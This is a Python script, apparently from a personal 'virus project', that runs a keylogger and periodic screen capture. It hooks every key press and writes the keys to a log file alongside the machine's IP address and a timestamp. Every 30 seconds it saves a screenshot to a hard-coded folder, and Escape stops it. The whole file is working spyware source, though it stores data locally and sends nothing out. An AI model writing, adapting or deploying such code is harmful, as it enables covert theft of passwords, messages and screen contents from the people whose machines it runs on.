# Needed imports below, look at README for nessary PIP installments.
import pyautogui # for cap
import threading # for timing
import keyboard # emg exit
import socket
import random
import os
from datetime import datetime
# Needed variables
hostname = socket.gethostname()
localaddress = socket.gethostbyname(hostname)
timesran = 0 # dont change, is nessary for no image overlapping.
intv = 30 # in seconds, change this based on how often you want the capture taken.
flag = True
timer = None
lfilesuffix = ".txt" # change only to stuff that is text WRITEABLE, default TXT.
loggingfilename = str("logging") + lfilesuffix # logging file name, change to your liking.
output_dir = r"C:\Users\kkhah\Documents\me-ryland-virus-project\mainrepo\data" # change to where you want the data stored. Always make sure it is the full, not relative path.
eventcount = 0
#                        ------------------------ Functionality -------------------------
def exitexe():
    global flag, timer
    flag = False
    if timer:
        timer.cancel()

def randomint():
    return random.randint(1,100)

def gettimeAnddate():
    return str(datetime.now())

def capsc():
    global timesran
    timesran += 1
    if not flag:
        exit()
    randomintforss = randomint()
    screenshot = pyautogui.screenshot()
    filename = f"peepernum#{randomintforss}_{timesran}.png"
    screenshot.save(os.path.join(output_dir, filename))
    if flag:
        timer = threading.Timer(intv, capsc)  # Executes every 5 seconds
        timer.start()

def setupfile():
    with open(os.path.join(output_dir, loggingfilename), "w") as file:
        file.write("This is the log for text like, current use, IP address and Key Logging." + "\n")
        file.write(f"------------- IP ADDRESS = {localaddress} -------------" + "\n")
        file.write(f"--------- DETECT KEY LOGS BELOW (DATE&TIME = {gettimeAnddate()}) ---------")


def writeevent(event):
   with open(os.path.join(output_dir, loggingfilename), "a") as file:
       global eventcount
       eventcount += 1
       if eventcount == 40:
           file.write(str(event.name) + "\n")
           eventcount = 0
       else:
           file.write(str(event.name) + " ")

#                 ------------------- Listener and Main Setup --------------------------
keyboard.on_press(writeevent)
setupfile()
capsc()


# ----------------------------------------- Main Loop ------------------------------------------
try:
    while flag:
        if keyboard.is_pressed('esc'):
            print("EMG hotkey.. Exiting now.")
            exitexe()
except KeyboardInterrupt:
    print("Keyboard Interrupt Detected, cleaning up now.")
except SystemExit:
    print("System Exit detected, cleaning up now.")
finally:
    if timer:
        timer.cancel()
    print(f"Cleaned up succesfully, goodbye! You might need to wait a while to get terminal access, expected wait time, {intv / 2}-{intv} seconds.")
